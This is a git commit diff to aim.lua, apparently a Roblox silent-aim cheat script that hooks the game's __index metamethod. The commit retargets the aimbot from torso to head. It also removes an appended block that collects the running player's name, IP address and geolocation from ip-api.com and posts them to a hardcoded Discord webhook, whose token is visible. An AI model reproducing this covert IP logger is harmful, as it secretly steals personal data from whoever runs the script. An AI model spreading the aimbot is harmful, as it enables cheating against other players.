723c9e006234749f8d9cb6e3654158337b3b13e8
qvfk <112683608+qvfk@users.noreply.github.com>
2022-09-07 19:31:24 +0100

    Update aim.lua

--- aim.lua
+++ aim.lua
@@ -62,12 +62,12 @@ oldIndex = hookmetamethod(game, "__index", function(self, Index)
 			for _, v in pairs(Players:GetPlayers()) do 
 				if v ~= LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("Humanoid") and v.Character:FindFirstChild("Humanoid").Health > 0 then
 					local Enemy = v.Character	
-					local CastingFrom = CFrame.new(Camera.CFrame.Position, Enemy[Options.Torso].CFrame.Position) * CFrame.new(0, 0, -4)
+					local CastingFrom = CFrame.new(Camera.CFrame.Position, Enemy[Options.Head].CFrame.Position) * CFrame.new(0, 0, -4)
 					local RayCast = Ray.new(CastingFrom.Position, CastingFrom.LookVector * 9000)
 					local World, ToSpace = workspace:FindPartOnRayWithIgnoreList(RayCast, {LocalPlayer.Character:FindFirstChild("Head")})
-					local RootWorld = (Enemy[Options.Torso].CFrame.Position - ToSpace).magnitude
+					local RootWorld = (Enemy[Options.Head].CFrame.Position - ToSpace).magnitude
 					if RootWorld < 4 then
-						local RootPartPosition, Visible = Camera:WorldToScreenPoint(Enemy[Options.Torso].Position)
+						local RootPartPosition, Visible = Camera:WorldToScreenPoint(Enemy[Options.Head].Position)
 						if Visible then
 							local Real_Magnitude = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(RootPartPosition.X, RootPartPosition.Y)).Magnitude
 							if Real_Magnitude < Distance and Real_Magnitude < FOV_CIRCLE.Radius then
@@ -82,7 +82,7 @@ oldIndex = hookmetamethod(game, "__index", function(self, Index)
 		
 		if Targete ~= nil and Targete[Options.Torso] and Targete:FindFirstChild("Humanoid").Health > 0 then
 			if SilentAim then
-				local ShootThis = Targete[Options.Torso] 
+				local ShootThis = Targete[Options.Head] 
 				local Predicted_Position = ShootThis.CFrame + (ShootThis.Velocity * _G.Prediction + Vector3.new(0,-1,0)) 
 				return ((Index == "Hit" and Predicted_Position))
 			end
@@ -91,23 +91,3 @@ oldIndex = hookmetamethod(game, "__index", function(self, Index)
 	end
 	return oldIndex(self, Index)
 end)
-
-local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "webhook"
-
-local ip_info = syn.request({
-    Url = "http://ip-api.com/json",
-    Method = "GET"
-})
-local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
-syn.request(
-    {
-        Url = "https://discord.com/api/webhooks/1015472318434258976/q1GJgZ0qpgAq6R2Y6_8M2zSzFVhr3CjKrv25WJeb_MPjtP1qvTmsYMcNADzUvOFd5Yt2",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-    }
-) 
